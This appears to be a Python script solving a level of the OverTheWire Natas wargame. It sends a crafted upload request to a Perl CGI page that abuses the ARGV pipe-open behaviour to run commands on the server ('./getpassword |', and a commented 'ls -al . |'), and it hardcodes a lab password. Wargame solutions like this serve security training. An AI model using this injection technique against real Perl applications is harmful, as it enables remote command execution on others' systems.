#! /usr/bin/env python

import requests
import re
import base64
import urllib
import string

usn = 'natas33'
url = 'http://%s.natas.labs.overthewire.org' % usn
passwd = 'shoogeiGa2yee3de6Aex8uaXeech5eey'
login = (usn, passwd)
request = requests.Session()



def get_source_code():
  
  connection = request.get(url, auth = login)
 
  #connection = request.post(url + "/index-source.html", auth = login,)

 
  print connection.text


def solve_lab():
  # connection = requests.post(url + "/index.pl?ls -al . |",
  #                        files=[("file", ("filename", "bogusFile"))],
  #                        data={"file": "ARGV"},
  #                        auth=login)

  # getpassword is suspect and it has the SUID set 's' as noted in the third permission field.

  connection = requests.post(url + "/index.pl?./getpassword |",
                         files=[("file", ("filename", "bogusFile"))],
                         data={"file": "ARGV"},
                         auth=login)
  print connection.text

  for x in connection.iter_lines():
      if "<th>" in x:
        print x
  #print connection.request.body   ## To view 
  
